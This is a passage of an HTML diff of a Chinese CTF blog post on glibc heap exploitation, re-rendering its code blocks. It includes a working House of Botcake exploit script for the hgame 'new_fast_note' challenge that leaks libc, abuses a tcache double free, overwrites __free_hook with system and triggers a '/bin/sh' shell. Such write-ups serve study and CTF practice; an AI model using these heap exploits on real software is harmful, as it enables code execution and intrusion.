+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="co">//同时由于(unsigned int)(sz)的原因，对应64程序只取size的低4字节，所以我们在利用寻找合适size的时候，类似这种情况（0x3168000000000060）也行，它等同于size=0x60</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="co">//unsigned int 在64位程序下只取低4字节</span></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="co">//所以此处可以分配fastbin而不会报错！</span></span></code></pre></div>
+<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230222112549250-1679370065076-3.png"></p>
+<h3 id="源码调试">源码调试</h3>
+<ol type="1">
+<li><code>pwndbg</code>自动读取工作目录下源码</li>
+<li><code>r = gdb.debug('./vuln', 'set debug-file-directory debug/')``gdb</code>启动程序，而不是<code>attach</code>，并设置调试信息</li>
+<li>放<code>glibc-all-in-one</code>的调试信息
+即<code>.debug</code>文件夹</li>
 </ol>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813181534392.png" alt></p>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813181949151.png" alt="成功示例"></p>
-<h3 id="House-Of-Botcake-new-fast-note"><a href="#House-Of-Botcake-new-fast-note" class="headerlink" title="House Of Botcake -- new_fast_note"></a><code>House Of Botcake -- new_fast_note</code></h3><pre><code class="lang-python">for i in range(10):
-    add(i,0x80,b&#39;0&#39;)
-for i in range(7):
-    delete(i)
-delete(8)
-show(8) #将chunk8进入unsorted bin中
-main_arena_addr = u64(r.recvuntil(b&#39;1.&#39;)[1:-3].ljust(8,b&#39;\x00&#39;)) 
-print(f&#39;main_arena_addr = &#123;hex(main_arena_addr)&#125;&#39;)
-libc_addr = main_arena_addr - 0x1ecbe0
-libc.address = libc_addr
-system_addr = libc.sym[&#39;system&#39;]
-#-----------------------libc泄露
-</code></pre>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813184141066.png" alt></p>
-<p>注意与下面的截图 对比大小与地址,<code>malloc_consolidate</code>块合并?</p>
-<pre><code class="lang-python">#House of botcake （glibc &gt; 2.25 且 UAF）
-#unsortedbin先进先出
-#tcachebins 先进后出
-
-delete(7) #将chunk7进入unsorted bin中 与8合并 与8合并但是 7开头
-add(10,0x80,b&#39;0&#39;) #将tcache bin中腾出空间
-delete(8) #将chunk8 加入tcache中 double free
-add(11,0xff,b&#39;\x00&#39;*0x80+p64(0)+p64(0x91)+p64(libc.sym[&#39;__free_hook&#39;])+b&#39;\x00&#39;*7) #写入到Tcache next中 通过 x /20gx addr + 大小来查看推算
-add(12,0x80,b&#39;/bin/sh\x00&#39;)#将tcache中下一个变为free hook
-add(13,0x80,p64(system_addr))#写free_hook
-delete(12)
-</code></pre>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813184218630.png" alt="delete(7)"></p>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813184335841.png" alt="delete(8)"></p>
-<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813184512080.png" alt="add(11)"></p>
+<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813181534392.png"></p>
+<figure>
+<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813181949151.png" alt="成功示例">
+<figcaption aria-hidden="true">成功示例</figcaption>
+</figure>
+<h3 id="house-of-botcake----new_fast_note"><code>House Of Botcake -- new_fast_note</code></h3>
+<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">10</span>):</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>    add(i,<span class="bn">0x80</span>,<span class="st">b&#39;0&#39;</span>)</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">7</span>):</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>    delete(i)</span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">8</span>)</span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>show(<span class="dv">8</span>) <span class="co">#将chunk8进入unsorted bin中</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>main_arena_addr <span class="op">=</span> u64(r.recvuntil(<span class="st">b&#39;1.&#39;</span>)[<span class="dv">1</span>:<span class="op">-</span><span class="dv">3</span>].ljust(<span class="dv">8</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)) </span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&#39;main_arena_addr = </span><span class="sc">&#123;</span><span class="bu">hex</span>(main_arena_addr)<span class="sc">&#125;</span><span class="ss">&#39;</span>)</span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>libc_addr <span class="op">=</span> main_arena_addr <span class="op">-</span> <span class="bn">0x1ecbe0</span></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>libc.address <span class="op">=</span> libc_addr</span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>system_addr <span class="op">=</span> libc.sym[<span class="st">&#39;system&#39;</span>]</span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a><span class="co">#-----------------------libc泄露</span></span></code></pre></div>
+<p><img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813184141066.png"></p>
+<p>注意与下面的截图
+对比大小与地址,<code>malloc_consolidate</code>块合并?</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="co">#House of botcake （glibc &gt; 2.25 且 UAF）</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="co">#unsortedbin先进先出</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="co">#tcachebins 先进后出</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">7</span>) <span class="co">#将chunk7进入unsorted bin中 与8合并 与8合并但是 7开头</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">10</span>,<span class="bn">0x80</span>,<span class="st">b&#39;0&#39;</span>) <span class="co">#将tcache bin中腾出空间</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">8</span>) <span class="co">#将chunk8 加入tcache中 double free</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">11</span>,<span class="bn">0xff</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="bn">0x80</span><span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(<span class="bn">0x91</span>)<span class="op">+</span>p64(libc.sym[<span class="st">&#39;__free_hook&#39;</span>])<span class="op">+</span><span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">7</span>) <span class="co">#写入到Tcache next中 通过 x /20gx addr + 大小来查看推算</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">12</span>,<span class="bn">0x80</span>,<span class="st">b&#39;/bin/sh</span><span class="ch">\x00</span><span class="st">&#39;</span>)<span class="co">#将tcache中下一个变为free hook</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>add(<span class="dv">13</span>,<span class="bn">0x80</span>,p64(system_addr))<span class="co">#写free_hook</span></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>delete(<span class="dv">12</span>)</span></code></pre></div>
+<figure>
+<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813184218630.png" alt="delete(7)">
+<figcaption aria-hidden="true">delete(7)</figcaption>
+</figure>
+<figure>
+<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813184335841.png" alt="delete(8)">
+<figcaption aria-hidden="true">delete(8)</figcaption>
+</figure>
+<figure>
+<img src="/cn/Sagiring_markdown/%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80/image-20230813184512080.png" alt="add(11)">
+<figcaption aria-hidden="true">add(11)</figcaption>
+</figure>
 
 
         <hr>
@@ -733,7 +764,7 @@ delete(12)
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">堆知识合集一</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#chunk%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">chunk结构</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">泄露libc</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">知道libc版本</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">不知道libc版本</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%80%9D%E8%B7%AF%E5%90%88%E9%9B%86"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">题目思路合集</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Freehook-UAF-hgame-editable-note"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">Freehook + UAF -- hgame editable_note</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#FastBin-DoubleFree-hgame-fast-note"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">FastBin + DoubleFree -- hgame fast_note</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">源码调试</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#House-Of-Botcake-new-fast-note"><span class="toc-nav-number">1.3.4.</span> <span class="toc-nav-text">House Of Botcake -- new_fast_note</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E5%A0%86%E7%9F%A5%E8%AF%86%E5%90%88%E9%9B%86%E4%B8%80"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">堆知识合集一</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#chunk%E7%BB%93%E6%9E%84"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">chunk结构</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">泄露libc</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">知道libc版本</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%B8%8D%E7%9F%A5%E9%81%93libc%E7%89%88%E6%9C%AC"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">不知道libc版本</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%A2%98%E7%9B%AE%E6%80%9D%E8%B7%AF%E5%90%88%E9%9B%86"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">题目思路合集</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#freehook-uaf----hgame-editable_note"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">Freehook + UAF -- hgame editable_note</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#fastbin-doublefree----hgame-fast_note"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">FastBin + DoubleFree -- hgame fast_note</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">源码调试</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#house-of-botcake----new_fast_note"><span class="toc-nav-number">1.3.4.</span> <span class="toc-nav-text">House Of Botcake -- new_fast_note</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
@@ -1257,6 +1288,21 @@ start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </scrip
 		<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
 
 		
-	</body>
+	<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
 </html>
 
